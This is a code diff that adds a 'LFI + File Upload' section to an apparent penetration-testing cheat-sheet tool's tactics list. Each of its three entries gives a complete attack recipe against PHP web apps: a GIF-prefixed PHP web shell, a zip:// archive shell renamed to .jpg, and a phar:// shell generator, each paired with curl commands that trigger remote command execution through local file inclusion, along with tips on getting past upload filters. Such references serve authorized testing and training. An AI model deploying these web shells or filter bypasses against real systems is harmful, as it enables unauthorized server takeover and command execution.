@@ -2810,6 +2810,15 @@ const TACTICS = [
             ],
           },
           {
+            id: 'lfi-st-upload',
+            name: 'LFI + File Upload',
+            commands: [
+              { id: 'lfi-fu0', label: 'Malicious GIF image (image upload)', os: 'Linux', command: '# Step 1: Create malicious GIF — magic bytes pass image checks, PHP still executes:\necho \'GIF8<?php system($_GET["cmd"]); ?>\' > shell.gif\n\n# Step 2: Upload via the web app (profile image, avatar, etc.)\n\n# Step 3: Find the upload path from page source after upload:\ncurl -s $$URL/settings.php | grep -i "shell.gif"\n# e.g. src="/profile_images/shell.gif"\n\n# Step 4: Include via LFI to execute:\ncurl -s "$$URL/index.php?language=./profile_images/shell.gif&cmd=id"', notes: 'GIF8 magic bytes let the file pass basic image-type checks while the PHP trailer still executes. Works with include/require. If the upload path is unknown, check the HTML source after upload or fuzz common directories (uploads/, profile_images/, avatars/).' },
+              { id: 'lfi-fu1', label: 'Malicious zip upload (zip:// wrapper)', os: 'Linux', command: '# Step 1: Create a PHP shell and zip it — rename to .jpg to bypass upload filters:\necho \'<?php system($_GET["cmd"]); ?>\' > shell.php\nzip shell.jpg shell.php\n\n# Step 2: Upload shell.jpg via the web app\n\n# Step 3: Include via zip:// — %23 is URL-encoded # to reference a file inside the archive:\ncurl -s "$$URL/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id"\n\n# In browser:\n$$URL/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id', notes: 'zip:// is not enabled by default — confirm availability first. Rename the archive to an allowed extension (.jpg, .png) to bypass upload filters. %23 is URL-encoded # for referencing files inside the zip.' },
+              { id: 'lfi-fu2', label: 'Malicious phar upload (phar:// wrapper)', os: 'Linux', command: '# Step 1: Write the phar generator script:\ncat > shell.php << \'EOF\'\n<?php\n$phar = new Phar(\'shell.phar\');\n$phar->startBuffering();\n$phar->addFromString(\'shell.txt\', \'<?php system($_GET["cmd"]); ?>\');\n$phar->setStub(\'<?php __HALT_COMPILER(); ?>\');\n$phar->stopBuffering();\nEOF\n\n# Step 2: Compile (phar.readonly must be 0) and rename as .jpg:\nphp --define phar.readonly=0 shell.php && mv shell.phar shell.jpg\n\n# Step 3: Upload shell.jpg via the web app\n\n# Step 4: Include via phar:// — %2F is URL-encoded / to reference internal file:\ncurl -s "$$URL/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id"', notes: 'phar.readonly=0 is required to compile the phar archive. The phar:// wrapper uses %2F (URL-encoded /) to reference internal files. Use this when zip:// is unavailable. Both zip and phar methods are considered unreliable — prefer the GIF image method when possible.' },
+            ],
+          },
+          {
             id: 'lfi-st-log',
             name: 'Log Poisoning',
             commands: [
